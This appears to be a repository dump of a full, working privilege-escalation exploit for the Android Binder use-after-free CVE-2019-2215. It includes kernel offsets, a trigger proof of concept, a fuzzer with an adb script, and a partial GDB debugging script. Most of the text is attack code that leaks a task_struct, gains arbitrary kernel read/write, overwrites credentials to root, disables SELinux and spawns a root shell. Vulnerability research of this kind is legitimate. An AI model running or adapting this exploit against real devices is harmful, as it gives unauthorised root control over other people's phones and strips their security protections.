void BinderUaF::initKernelReadWritePipe() {
    INFO("[+] Setting up pipe for kernel read/write\n");

    if (pipe(m_kernel_rw_pipe_fd) == -1) {
        ERR("\t[-] Unable to create pipe\n");
        exit(EXIT_FAILURE);
    } else {
        INFO("\t[*] Pipe created successfully\n");
    }
}

//======================================================
// EXPLOITATION PRIMITIVES
//======================================================

/**
 * Free the binder thread structure to create UAF condition
 */
void BinderUaF::freeBinderThread() {
    INFO("[+] Freeing binder_thread\n");

    ioctl(m_binder_fd, BINDER_THREAD_EXIT, NULL);
}

/**
 * Link epoll waitqueue to binder thread waitqueue
 */
void BinderUaF::linkEventPollWaitQueueToBinderThreadWaitQueue() {
    INFO("[+] Linking eppoll_entry->wait.entry to binder_thread->wait.head\n");

    epoll_ctl(m_epoll_fd, EPOLL_CTL_ADD, m_binder_fd, &m_epoll_event);
}

/**
 * Unlink epoll waitqueue from binder thread waitqueue
 */
void BinderUaF::unlinkEventPollWaitQueueFromBinderThreadWaitQueue() {
    INFO("[+] Un-linking eppoll_entry->wait.entry from binder_thread->wait.head\n");

    epoll_ctl(m_epoll_fd, EPOLL_CTL_DEL, m_binder_fd, &m_epoll_event);
}

//======================================================
// KERNEL MEMORY ACCESS
//======================================================

/**
 * Read from arbitrary kernel address
 *
 * @param Address: address from where to read
 * @param Length: how much to read
 * @param uBuffer: output user buffer
 */
void BinderUaF::kRead(void *Address, size_t Length, void *uBuffer) {
    ssize_t nBytesWritten = write(m_kernel_rw_pipe_fd[1], Address, Length);

    if ((size_t) nBytesWritten != Length) {
        ERR("[-] Failed to write data from kernel: %p", Address);
        exit(EXIT_FAILURE);
    }

    ssize_t nBytesRead = read(m_kernel_rw_pipe_fd[0], uBuffer, Length);

    if ((size_t) nBytesRead != Length) {
        ERR("[-] Failed to read data from kernel: %p", Address);
        exit(EXIT_FAILURE);
    }
}

/**
 * Write to arbitrary kernel address
 *
 * @param Address: address where to write
 * @param Length: how much to write
 * @param uBuffer: input user buffer
 */
void BinderUaF::kWrite(void *Address, size_t Length, void *uBuffer) {
    ssize_t nBytesWritten = write(m_kernel_rw_pipe_fd[1], uBuffer, Length);

    if ((size_t) nBytesWritten != Length) {
        ERR("[-] Failed to write data from user: %p", Address);
        exit(EXIT_FAILURE);
    }

    ssize_t nBytesRead = read(m_kernel_rw_pipe_fd[0], Address, Length);

    if ((size_t) nBytesRead != Length) {
        ERR("[-] Failed to write data to kernel: %p", Address);
        exit(EXIT_FAILURE);
    }
}

/**
 * Read qword from arbitrary address
 *
 * @param Address: address from where to read
 * @return: qword
 */
uint64_t BinderUaF::kReadQword(void *Address) {
    uint64_t buffer = 0;
    kRead(Address, sizeof(buffer), &buffer);
    return buffer;
}

/**
 * Read dword from arbitrary address
 *
 * @param Address: address from where to read
 * @return: dword
 */
uint32_t BinderUaF::kReadDword(void *Address) {
    uint32_t buffer = 0;
    kRead(Address, sizeof(buffer), &buffer);
    return buffer;
}

/**
 * Write dword to arbitrary address
 *
 * @param Address: address where to write
 * @param Value: value to write
 */
void BinderUaF::kWriteDword(void *Address, uint32_t Value) {
    kWrite(Address, sizeof(Value), &Value);
}

/**
 * Write qword to arbitrary address
 *
 * @param Address: address where to write
 * @param Value: value to write
 */
void BinderUaF::kWriteQword(void *Address, uint64_t Value) {
    kWrite(Address, sizeof(Value), &Value);
}

//======================================================
// EXPLOITATION STAGES
//======================================================

/**
 * Leak task_struct pointer from binder_thread
 */
void BinderUaF::leakTaskStruct() {
    int pipe_fd[2] = {0};
    ssize_t nBytesRead = 0;
    static char dataBuffer[PAGE_SIZE] = {0};
    struct iovec iovecStack[IOVEC_COUNT] = {nullptr};

    // Setup environment
    setupBinder();
    setupEventPoll();

    // Setup pipe for iovec
    INFO("[+] Setting up pipe\n");

    if (pipe(pipe_fd) == -1) {
        ERR("\t[-] Unable to create pipe\n");
        exit(EXIT_FAILURE);
    } else {
        INFO("\t[*] Pipe created successfully\n");
    }

    // Reduce pipe capacity
    if (fcntl(pipe_fd[0], F_SETPIPE_SZ, PAGE_SIZE) == -1) {
        ERR("\t[-] Unable to change the pipe capacity\n");
        exit(EXIT_FAILURE);
    } else {
        INFO("\t[*] Changed the pipe capacity to: 0x%x\n", PAGE_SIZE);
    }

    INFO("[+] Setting up iovecs\n");

    // Setup iovec array for memory corruption
    mmap4gbAlignedPage();

    iovecStack[IOVEC_WQ_INDEX].iov_base = m_4gb_aligned_page;
    iovecStack[IOVEC_WQ_INDEX].iov_len = PAGE_SIZE;
    iovecStack[IOVEC_WQ_INDEX + 1].iov_base = (void *) 0x41414141;
    iovecStack[IOVEC_WQ_INDEX + 1].iov_len = PAGE_SIZE;

    // Link wait queues
    linkEventPollWaitQueueToBinderThreadWaitQueue();

    // Fork to handle race condition
    pid_t childPid = fork();

    if (childPid == 0) {
        // Child process
        sleep(2);
        unlinkEventPollWaitQueueFromBinderThreadWaitQueue();
        
        nBytesRead = read(pipe_fd[0], dataBuffer, sizeof(dataBuffer));
        if (nBytesRead != PAGE_SIZE) {
            ERR("\t[-] CHILD: read failed. nBytesRead: 0x%lx, expected: 0x%x", nBytesRead, PAGE_SIZE);
            exit(EXIT_FAILURE);
        }
        exit(EXIT_SUCCESS);
    }

    // Parent process
    freeBinderThread();

    ssize_t nBytesWritten = writev(pipe_fd[1], iovecStack, IOVEC_COUNT);

    if (nBytesWritten != PAGE_SIZE * 2) {
        ERR("\t[-] writev failed. nBytesWritten: 0x%lx, expected: 0x%x\n", nBytesWritten, PAGE_SIZE * 2);
        exit(EXIT_FAILURE);
    } else {
        INFO("\t[*] Wrote 0x%lx bytes\n", nBytesWritten);
    }

    // Read leaked kernel data
    nBytesRead = read(pipe_fd[0], dataBuffer, sizeof(dataBuffer));

    if (nBytesRead != PAGE_SIZE) {
        ERR("\t[-] read failed. nBytesRead: 0x%lx, expected: 0x%x", nBytesRead, PAGE_SIZE);
        exit(EXIT_FAILURE);
    }

    // Wait for child process
    wait(nullptr);

    // Extract task_struct pointer and other important addresses
    m_task_struct = (struct task_struct *) *((int64_t *) (dataBuffer + TASK_STRUCT_OFFSET_IN_LEAKED_DATA));
    m_pidAddress = (void *) ((int8_t *) m_task_struct + offsetof(struct task_struct, pid));
    m_credAddress = (void *) ((int8_t *) m_task_struct + offsetof(struct task_struct, cred));
    m_nsproxyAddress = (void *) ((int8_t *) m_task_struct + offsetof(struct task_struct, nsproxy));

    INFO("[+] Leaked task_struct: %p\n", m_task_struct);
    INFO("\t[*] &task_struct->pid: %p\n", m_pidAddress);
    INFO("\t[*] &task_struct->cred: %p\n", m_credAddress);
    INFO("\t[*] &task_struct->nsproxy: %p\n", m_nsproxyAddress);
}

/**
 * Clobber task_struct addr_limit to bypass userspace checks
 */
void BinderUaF::clobberAddrLimit() {
    int sock_fd[2] = {0};
    ssize_t nBytesWritten = 0;
    struct msghdr message = {nullptr};
    struct iovec iovecStack[IOVEC_COUNT] = {nullptr};

    // Setup environment
    setupBinder();
    setupEventPoll();

    // Setup socketpair for communication
    INFO("[+] Setting up socket\n");

    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sock_fd) == -1) {
        ERR("\t[-] Unable to create socketpair\n");
        exit(EXIT_FAILURE);
    } else {
        INFO("\t[*] Socketpair created successfully\n");
    }

    // Write junk data to socket
    static char junkSocketData[] = { 0x41 };

    INFO("[+] Writing junk data to socket\n");

    nBytesWritten = write(sock_fd[1], &junkSocketData, sizeof(junkSocketData));

    if (nBytesWritten != sizeof(junkSocketData)) {
        ERR("\t[-] write failed. nBytesWritten: 0x%lx, expected: 0x%lx\n", nBytesWritten, sizeof(junkSocketData));
        exit(EXIT_FAILURE);
    }

    // Setup iovecs for memory corruption
    INFO("[+] Setting up iovecs\n");

    mmap4gbAlignedPage();

    iovecStack[IOVEC_WQ_INDEX].iov_base = m_4gb_aligned_page;
    iovecStack[IOVEC_WQ_INDEX].iov_len = 1;
    iovecStack[IOVEC_WQ_INDEX + 1].iov_base = (void *) 0x41414141;
    iovecStack[IOVEC_WQ_INDEX + 1].iov_len = 0x8 + 0x8 + 0x8 + 0x8;
    iovecStack[IOVEC_WQ_INDEX + 2].iov_base = (void *) 0x42424242;
    iovecStack[IOVEC_WQ_INDEX + 2].iov_len = 0x8;

    // Prepare final data to clobber addr_limit
    static uint64_t finalSocketData[] = {
            0x1,                    // iovecStack[IOVEC_WQ_INDEX].iov_len
            0x41414141,             // iovecStack[IOVEC_WQ_INDEX + 1].iov_base
            0x8 + 0x8 + 0x8 + 0x8,  // iovecStack[IOVEC_WQ_INDEX + 1].iov_len
            (uint64_t) ((uint8_t *) m_task_struct +
                        OFFSET_TASK_STRUCT_ADDR_LIMIT), // iovecStack[IOVEC_WQ_INDEX + 2].iov_base
            0xFFFFFFFFFFFFFFFE      // addr_limit value
    };

    // Prepare message
    message.msg_iov = iovecStack;
    message.msg_iovlen = IOVEC_COUNT;

    // Link wait queues
    linkEventPollWaitQueueToBinderThreadWaitQueue();

    // Fork to handle race condition
    pid_t childPid = fork();

    if (childPid == 0) {
        // Child process
        sleep(2);
        unlinkEventPollWaitQueueFromBinderThreadWaitQueue();
        
        nBytesWritten = write(sock_fd[1], finalSocketData, sizeof(finalSocketData));
        if (nBytesWritten != sizeof(finalSocketData)) {
            ERR("\t[-] write failed. nBytesWritten: 0x%lx, expected: 0x%lx", nBytesWritten, sizeof(finalSocketData));
            exit(EXIT_FAILURE);
        }
        exit(EXIT_SUCCESS);
    }

    // Parent process
    freeBinderThread();

    // Block in recvmsg
    ssize_t nBytesReceived = recvmsg(sock_fd[0], &message, MSG_WAITALL);

    // Verify corruption success
    ssize_t expectedBytesReceived = iovecStack[IOVEC_WQ_INDEX].iov_len +
                                    iovecStack[IOVEC_WQ_INDEX + 1].iov_len +
                                    iovecStack[IOVEC_WQ_INDEX + 2].iov_len;

    if (nBytesReceived != expectedBytesReceived) {
        ERR("\t[-] recvmsg failed. nBytesReceived: 0x%lx, expected: 0x%lx\n", nBytesReceived, expectedBytesReceived);
        exit(EXIT_FAILURE);
    }

    // Wait for child process
    wait(nullptr);
}

//======================================================
// PRIVILEGE ESCALATION
//======================================================

/**
 * Verify kernel read/write primitives are working
 */
void BinderUaF::verifyArbitraryReadWrite() {
    INFO("[+] Verifying arbitrary read/write primitive\n");

    pid_t currentPid = getpid();
    pid_t expectedPid = kReadDword(m_pidAddress);

    INFO("\t[*] currentPid: %d\n", currentPid);
    INFO("\t[*] expectedPid: %d\n", expectedPid);

    if (currentPid != expectedPid) {
        ERR("\t[-] Arbitrary read/write failed\n");
        exit(EXIT_FAILURE);
    } else {
        INFO("\t[*] Arbitrary read/write successful\n");
    }
}

/**
 * Patch process credentials to gain root privileges
 */
void BinderUaF::patchCred() {
    INFO("[+] Patching current task cred members\n");

    // Read cred pointer from task_struct
    m_cred = (struct cred *) kReadQword(m_credAddress);

    if (!m_cred) {
        ERR("\t[-] Failed to read cred: %p", m_credAddress);
        exit(EXIT_FAILURE);
    }

    INFO("\t[*] cred: %p\n", m_cred);

    // Patch cred structure with root privileges
    kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, uid)), GLOBAL_ROOT_UID);
    kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, gid)), GLOBAL_ROOT_GID);
    kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, suid)), GLOBAL_ROOT_UID);
    kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, sgid)), GLOBAL_ROOT_GID);
    kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, euid)), GLOBAL_ROOT_UID);
    kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, egid)), GLOBAL_ROOT_GID);
    kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, fsuid)), GLOBAL_ROOT_UID);
    kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, fsgid)), GLOBAL_ROOT_GID);
    kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, securebits)), SECUREBITS_DEFAULT);
    kWriteQword((void *) ((uint8_t *) m_cred + offsetof(struct cred, cap_inheritable)), CAP_EMPTY_SET);
    kWriteQword((void *) ((uint8_t *) m_cred + offsetof(struct cred, cap_permitted)), CAP_FULL_SET);
    kWriteQword((void *) ((uint8_t *) m_cred + offsetof(struct cred, cap_effective)), CAP_FULL_SET);
    kWriteQword((void *) ((uint8_t *) m_cred + offsetof(struct cred, cap_bset)), CAP_FULL_SET);
    kWriteQword((void *) ((uint8_t *) m_cred + offsetof(struct cred, cap_ambient)), CAP_EMPTY_SET);
}

/**
 * Disable SELinux enforcement globally
 */
void BinderUaF::disableSELinuxEnforcing() {
    INFO("[+] Verifying if selinux enforcing is enabled\n");

    // Find kernel base through nsproxy
    ptrdiff_t nsProxy = kReadQword(m_nsproxyAddress);
    if (!nsProxy) {
        ERR("\t[-] Failed to read nsproxy: %p", m_nsproxyAddress);
        exit(EXIT_FAILURE);
    }

    // Calculate addresses based on kernel base
    ptrdiff_t kernelBase = nsProxy - SYMBOL_OFFSET_init_nsproxy;
    auto selinuxEnforcing = (void *) (kernelBase + SYMBOL_OFFSET_selinux_enforcing);

    INFO("\t[*] nsproxy: 0x%lx\n", nsProxy);
    INFO("\t[*] Kernel base: 0x%lx\n", kernelBase);
    INFO("\t[*] selinux_enforcing: %p\n", selinuxEnforcing);

    // Check if SELinux is enabled
    int selinuxEnabled = kReadDword(selinuxEnforcing);
    if (!selinuxEnabled) {
        INFO("\t[*] selinux enforcing is disabled\n");
        return;
    }

    INFO("\t[*] selinux enforcing is enabled\n");

    // Disable SELinux
    kWriteDword(selinuxEnforcing, 0x0);
    INFO("\t[*] Disabled selinux enforcing\n");
}

/**
 * Verify if we have root privileges
 */
void BinderUaF::verifyRoot() {
    INFO("[+] Verifying if rooted\n");

    uid_t realUserId = getuid();
    INFO("\t[*] uid: 0x%x\n", realUserId);

    if (realUserId != 0) {
        ERR("\t[-] Rooting failed\n");
        exit(EXIT_FAILURE);
    } else {
        INFO("\t[*] Rooting successful\n");
    }
}

/**
 * Spawn a root shell
 */
void BinderUaF::spawnRootShell() {
    INFO("[+] Spawning root shell\n");
    system("/bin/sh");
}

//======================================================
// MAIN ENTRY POINT
//======================================================

/**
 * Main exploit execution flow
 */
int main() {
    auto *binderUaF = new BinderUaF();

    // Setup environment
    binderUaF->bindToCPU();
    
    // Stage 1: Leak kernel memory
    binderUaF->leakTaskStruct();
    
    // Stage 2: Bypass kernel protections
    binderUaF->clobberAddrLimit();
    binderUaF->initKernelReadWritePipe();
    binderUaF->verifyArbitraryReadWrite();
    
    // Stage 3: Privilege escalation
    binderUaF->patchCred();
    binderUaF->disableSELinuxEnforcing();
    binderUaF->verifyRoot();
    
    // Spawn root shell
    binderUaF->spawnRootShell();

    return EXIT_SUCCESS;
}
```

`exploit-code/binder_cve_2019_2215_exploit.h`:

```h
/*
 * Full exploit implementation for the Android Binder UAF vulnerability
 * This class handles privilege escalation through kernel memory corruption
 *
 * References:
 * - https://bugs.chromium.org/p/project-zero/issues/detail?id=1942
 * - https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html
 * - https://groups.google.com/d/msg/syzkaller-bugs/QyXdgUhAF50/g-FXVo1OAwAJ
 *
 * Credits:
 * - Maddie Stone (@maddiestone) - Project Zero
 * - Jann Horn (@tehjh) - Project Zero
 */

#pragma once
#ifndef __BINDER_EXPLOIT_H__
#define __BINDER_EXPLOIT_H__

#include "common.h"

/**
 * Constants and definitions for the exploit
 */
#define BINDER_THREAD_EXIT 0x40046208ul
#define TASK_STRUCT_OFFSET_IN_LEAKED_DATA 0xE8
#define IOVEC_COUNT (int)(sizeof(struct binder_thread) / sizeof(struct iovec))
#define IOVEC_WQ_INDEX (int)(offsetof(struct binder_thread, wait) / sizeof(struct iovec))

/**
 * BinderUaF - Class that encapsulates the complete exploitation chain for CVE-2019-2215
 *
 * This exploit works by:
 * 1. Creating a race condition in the Binder IPC mechanism
 * 2. Leaking kernel memory through UAF condition
 * 3. Overwriting the addr_limit to enable kernel memory access
 * 4. Modifying process credentials to gain root privileges
 * 5. Disabling SELinux and spawning a privileged shell
 */
class BinderUaF
{
private:
    // File descriptors and kernel objects
    int m_epoll_fd = 0;
    int m_binder_fd = 0;
    int m_kernel_rw_pipe_fd[2] = {0};

    // Memory management
    void *m_4gb_aligned_page = nullptr;

    // Kernel addresses and structures
    void *m_pidAddress = nullptr;
    struct cred *m_cred = nullptr;
    void *m_credAddress = nullptr;
    void *m_nsproxyAddress = nullptr;
    struct task_struct *m_task_struct = nullptr;

    // Event polling configuration
    struct epoll_event m_epoll_event = {.events = EPOLLIN};

public:
    // Constructor displays banner
    BinderUaF()
    {
        INFO(BANNER);
    };

    // Exploitation preparation functions
    void bindToCPU();
    void initKernelReadWritePipe();
    void setupBinder();
    void setupEventPoll();
    void mmap4gbAlignedPage();

    // Primary exploitation functions
    void freeBinderThread();
    void linkEventPollWaitQueueToBinderThreadWaitQueue();
    void unlinkEventPollWaitQueueFromBinderThreadWaitQueue();
    void leakTaskStruct();
    void clobberAddrLimit();

    // Post-exploitation functions
    void verifyArbitraryReadWrite();
    void patchCred();
    void verifyRoot();
    void disableSELinuxEnforcing();
    void spawnRootShell();

    // Kernel memory access primitives
    void kRead(void *Address, size_t Length, void *uBuffer);
    void kWrite(void *Address, size_t Length, void *uBuffer);
    uint64_t kReadQword(void *Address);
    uint32_t kReadDword(void *Address);
    void kWriteQword(void *Address, uint64_t Value);
    void kWriteDword(void *Address, uint32_t Value);
};

#endif // __BINDER_EXPLOIT_H__
```

`exploit-code/binder_cve_2019_2215_poc.c`:

```c
/*
 * Originally discovered via syzkaller and reported by Project Zero
 * Simple demonstration of the race condition in the Android Binder IPC mechanism
 *
 * References:
 * - https://bugs.chromium.org/p/project-zero/issues/detail?id=1942
 * - https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html
 * - https://groups.google.com/d/msg/syzkaller-bugs/QyXdgUhAF50/g-FXVo1OAwAJ
 *
 * Credits:
 * - Maddie Stone (@maddiestone) - Project Zero
 * - Jann Horn (@tehjh) - Project Zero
 *
 * This minimal PoC demonstrates the vulnerability by:
 * 1. Opening a binder file descriptor
 * 2. Setting up an epoll instance that monitors the binder fd
 * 3. Triggering the BINDER_THREAD_EXIT ioctl to create the UAF condition
 */

#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

/* Binder thread exit ioctl command */
#define BINDER_THREAD_EXIT 0x40046208ul

int main()
{
    int binder_fd, epoll_fd;
    struct epoll_event event = {.events = EPOLLIN};

    /* Open the binder device */
    binder_fd = open("/dev/binder", O_RDONLY);
    if (binder_fd < 0)
    {
        perror("Failed to open binder device");
        return EXIT_FAILURE;
    }

    /* Create an epoll instance */
    epoll_fd = epoll_create(1000);
    if (epoll_fd < 0)
    {
        perror("Failed to create epoll instance");
        close(binder_fd);
        return EXIT_FAILURE;
    }

    /* Register the binder fd with epoll */
    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &event) < 0)
    {
        perror("Failed to add binder fd to epoll");
        close(epoll_fd);
        close(binder_fd);
        return EXIT_FAILURE;
    }

    /* Trigger the use-after-free condition */
    printf("[+] Triggering CVE-2019-2215 Binder UAF condition\n");
    ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
    printf("[+] PoC completed\n");

    return EXIT_SUCCESS;
}
```

`exploit-code/common.h`:

```h
/*
 * ╔═══════════════════════════════════════════════════════════╗
 * ║  CVE-2019-2215 Android Binder Use-After-Free Exploit      ║
 * ║  Common Definitions and Data Structures                   ║
 * ╚═══════════════════════════════════════════════════════════╝
 *
 * References:
 * - https://bugs.chromium.org/p/project-zero/issues/detail?id=1942
 * - https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html
 * - https://groups.google.com/d/msg/syzkaller-bugs/QyXdgUhAF50/g-FXVo1OAwAJ
 * 
 * Credits:
 * - Maddie Stone (@maddiestone) - Project Zero
 * - Jann Horn (@tehjh) - Project Zero
 */

#pragma once
#ifndef __COMMON_H__
#define __COMMON_H__

//======================================================
// SYSTEM INCLUDES
//======================================================
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <unistd.h>

//======================================================
// LOGGING MACROS
//======================================================
#define INFO(...) printf(__VA_ARGS__)
#define ERR(...) printf(__VA_ARGS__)

//======================================================
// KERNEL OFFSETS AND CONSTANTS
//======================================================
// Task structure offsets
#define OFFSET_TASK_STRUCT_ADDR_LIMIT 0xA18

// UID/GID constants
#define GLOBAL_ROOT_UID        ((uint32_t)0)
#define GLOBAL_ROOT_GID        ((uint32_t)0)
#define SECUREBITS_DEFAULT     ((uint32_t)0x00000000)

// Capability sets
#define CAP_EMPTY_SET          ((uint64_t)0)
#define CAP_FULL_SET           ((uint64_t)0x3FFFFFFFFF)

/*
 * Kernel symbol offsets derived from System.map:
 * 
 * ffffffff80200000 T _stext
 * ffffffff816acfe8 B selinux_enforcing
 * ffffffff81433ac0 D init_nsproxy
 */

// Offset from kernel base to init_nsproxy
#define SYMBOL_OFFSET_init_nsproxy    ((ptrdiff_t)0x1233ac0)

// Offset from kernel base to selinux_enforcing
// Note: This offset might change between kernel builds.
// If SELinux patching fails, update this offset.
#define SYMBOL_OFFSET_selinux_enforcing ((ptrdiff_t)0x14acfe8)

//======================================================
// KERNEL DATA STRUCTURES
//======================================================

/**
 * Binder thread structure
 * Used to understand memory layout for exploitation
 */
struct binder_thread {
    uint8_t junk1[160];  /* 0x00 - 0xa0 */
    uint8_t wait[24];    /* 0xa0 - 0xb8 - Key structure for exploitation */
    uint8_t junk2[224];  /* 0xb8 - 0x198 */
} __attribute__((packed)); /* total size: 0x198 */

/**
 * Task structure - represents a process in the kernel
 * Contains critical process information we need to modify
 */
struct task_struct {
    uint8_t junk1[1256]; /* 0x000 - 0x4e8 */
    pid_t pid;           /* 0x4e8 - 0x4ec - Process ID */
    uint8_t junk2[412];  /* 0x4ec - 0x688 */
    uint64_t cred;       /* 0x688 - 0x690 - Credentials pointer */
    uint8_t junk3[48];   /* 0x690 - 0x6c0 */
    uint64_t nsproxy;    /* 0x6c0 - 0x6c8 - Namespace proxy pointer */
    uint8_t junk4[1944]; /* 0x6c8 - 0xe60 */
} __attribute__((packed)); /* total size: 0xe60 */

/**
 * Credentials structure - stores process privileges
 * This is our primary target for privilege escalation
 */
struct cred {
    int32_t usage;             /* 0x00 - 0x04 - Reference counter */
    uint32_t uid;              /* 0x04 - 0x08 - User ID */
    uint32_t gid;              /* 0x08 - 0x0c - Group ID */
    uint32_t suid;             /* 0x0c - 0x10 - Saved UID */
    uint32_t sgid;             /* 0x10 - 0x14 - Saved GID */
    uint32_t euid;             /* 0x14 - 0x18 - Effective UID */
    uint32_t egid;             /* 0x18 - 0x1c - Effective GID */
    uint32_t fsuid;            /* 0x1c - 0x20 - FS UID */
    uint32_t fsgid;            /* 0x20 - 0x24 - FS GID */
    uint32_t securebits;       /* 0x24 - 0x28 - POSIX capabilities */
    uint64_t cap_inheritable;  /* 0x28 - 0x30 - Inheritable capabilities */
    uint64_t cap_permitted;    /* 0x30 - 0x38 - Permitted capabilities */
    uint64_t cap_effective;    /* 0x38 - 0x40 - Effective capabilities */
    uint64_t cap_bset;         /* 0x40 - 0x48 - Capability bounding set */
    uint64_t cap_ambient;      /* 0x48 - 0x50 - Ambient capabilities */
    uint8_t junk2[40];         /* 0x50 - 0x78 */
    void *security;            /* 0x78 - 0x80 - Security context */
    uint8_t junk3[40];         /* 0x80 - 0xa8 */
} __attribute__((packed)); /* total size: 0xa8 */

// Banner text displayed at start
#define BANNER \
"╔═══════════════════════════════════════════════════════════╗\n"\
"║  CVE-2019-2215: Android Binder Use-After-Free Exploit     ║\n"\
"║                                                           ║\n"\
"╚═══════════════════════════════════════════════════════════╝\n\n"

#endif // __COMMON_H__
```

`fuzzer/binder_fuzzer.c`:

```c
// binder_fuzzer.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/epoll.h>
#include <linux/android/binder.h>

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <input_file>\n", argv[0]);
        return 1;
    }

    // Read fuzzer input
    FILE *f = fopen(argv[1], "rb");
    if (!f) return 1;
    
    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    fseek(f, 0, SEEK_SET);
    
    unsigned char *buffer = malloc(fsize + 1);
    fread(buffer, fsize, 1, f);
    fclose(f);
    
    // Open binder device
    int fd_binder = open("/dev/binder", O_RDWR);
    if (fd_binder < 0) return 1;
    
    // Create an epoll instance
    int fd_epoll = epoll_create(1);
    if (fd_epoll < 0) return 1;
    
    // Add binder to epoll
    struct epoll_event ev;
    ev.events = EPOLLIN;
    ev.data.fd = fd_binder;
    epoll_ctl(fd_epoll, EPOLL_CTL_ADD, fd_binder, &ev);
    
    // Use input data as parameters for ioctl calls
    struct binder_write_read bwr = {0};
    if (fsize >= sizeof(bwr)) {
        memcpy(&bwr, buffer, sizeof(bwr));
    }
    
    // Try various binder operations
    ioctl(fd_binder, BINDER_VERSION, &bwr);
    ioctl(fd_binder, BINDER_WRITE_READ, &bwr);
    ioctl(fd_binder, BINDER_THREAD_EXIT, 0);
    
    // Try to trigger the bug
    close(fd_binder);
    epoll_ctl(fd_epoll, EPOLL_CTL_DEL, fd_binder, &ev);
    
    close(fd_epoll);
    free(buffer);
    return 0;
}
```

`fuzzer/fuzzer_wrapper.sh`:

```sh
#!/bin/bash
adb push $1 /data/local/tmp/input.bin
adb shell /data/local/tmp/binder_fuzzer /data/local/tmp/input.bin
exit $?
```

`gdb-scripts/binder_debug.py`:

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Android Binder Thread Debugging Script for CVE-2019-2215
--------------------------------------------------------

This GDB script helps debug the Android Binder Use-After-Free vulnerability
by monitoring the key operations that lead to the exploitation:
1. Tracking binder_thread objects before they are freed
2. Monitoring the wait queue unlink operations that trigger the UAF condition

The script sets breakpoints at critical points in kernel execution and 
automatically dumps memory at these points to help visualize the exploit.

"""

import gdb


class CurrentTaskHelper:
    """Helper functions to get information about the current kernel task"""

    @staticmethod
    def get_current_task():
        """Get current task_struct for the running process"""
        per_cpu_offset = gdb.parse_and_eval("__per_cpu_offset[0]")
        current_task_offset = gdb.parse_and_eval("current_task").address

        current_task = gdb.parse_and_eval(
            "*(struct task_struct *)*(long *){0}".format(
                long(per_cpu_offset) + long(current_task_offset))
        )
        return current_task

    @staticmethod
    def get_current_proc_comm():
        """Get the command name of the current process"""
        current_task = CurrentTaskHelper.get_current_task()
        return current_task["comm"].string()


class BinderThreadMonitor:
    """Tracks and dumps binder_thread structures during exploitation"""
    
    # Stores the address of the binder_thread being monitored
    binder_thread_address = None
    
    @classmethod
    def set_and_dump_binder_thread(cls, parameters):
        """Store binder_thread address and dump its contents"""
        cls.binder_thread_address = parameters["thread"]
        gdb.write("\n[+] Saving binder_thread address: {0}\n".format(cls.binder_thread_address))
        gdb.execute("x/51gx {0}".format(cls.binder_thread_address))
        gdb.write("\n")
    
    @classmethod
    def dump_on_waitqueue_operation(cls, parameters):
        """Dump binder_thread during waitqueue operations if it matches our target"""
        if not cls.binder_thread_address:
            return
        
        # Check if this wait queue operation is related to our target binder_thread
        if long(cls.binder_thread_address) + 0xA0 == parameters["wq_head"]:
            gdb.write("\n[+] Detected waitqueue operation on our target binder_thread!\n")
            gdb.execute("x/51gx {0}".format(cls.binder_thread_address))
            gdb.write("\n")


class EnterBreakpoint(gdb.Breakpoint):
    """Enhanced breakpoint that triggers when entering a function"""
    
    def __init__(
        self, proc_cmd, entry_symbol, param_list=None,
        exit_symbol=None, break_at_entry=False, entry_callback=None,
        break_at_exit=False, exit_callback=None, set_exit_bp=False
    ):
        super(EnterBreakpoint, self).__init__(entry_symbol)

        self.silent = True
        self.proc_cmd = proc_cmd
        self.function_name = entry_symbol
        self.function_params = param_list or []
        self.exit_symbol = exit_symbol
        self.break_at_entry = break_at_entry
        self.entry_callback = entry_callback
        self.break_at_exit = break_at_exit
        self.exit_callback = exit_callback
        self.set_exit_bp = set_exit_bp
        self.exit_bp_already_set = False
        self.parameter = {}

    def stop(self):
        # Only process breakpoints for our target process
        is_target_process = False
        proc_comm = CurrentTaskHelper.get_current_proc_comm()
        
        if self.proc_cmd in proc_comm:
            is_target_process = True
        
        if not is_target_process:
            return False
        
        # Gather function parameters
        for param_name in self.function_params:
            self.parameter[param_name] = gdb.newest_frame().read_var(param_name)

        # Format parameters for display
        params = ", ".join(f"{key}={value}" for key, value in self.parameter.items())
        
        # Log function entry
        gdb.write(f"[-] {self.function_name}({params}) [ENTER]\n")

        # Call the entry callback if provided
        if self.entry_callback:
            self.entry_callback(self.parameter)
        
        # Set up exit breakpoint if requested and not already set
        if self.set_exit_bp and not self.exit_bp_already_set:
            ExitBreakpoint(
                proc_cmd=self.proc_cmd, 
                entry_symbol=self.function_name,
                exit_symbol=self.exit_symbol, 
                params=self.parameter,
                break_at_exit=self.break_at_exit, 
                exit_callback=self.exit_callback
            )
            self.exit_bp_already_set = True

        # Determine if we should stop execution
        return self.break_at_entry


class ExitBreakpoint(gdb.Breakpoint):
    """Enhanced breakpoint that triggers when exiting a function"""
    
    def __init__(
        self, proc_cmd, entry_symbol, exit_symbol, params=None,
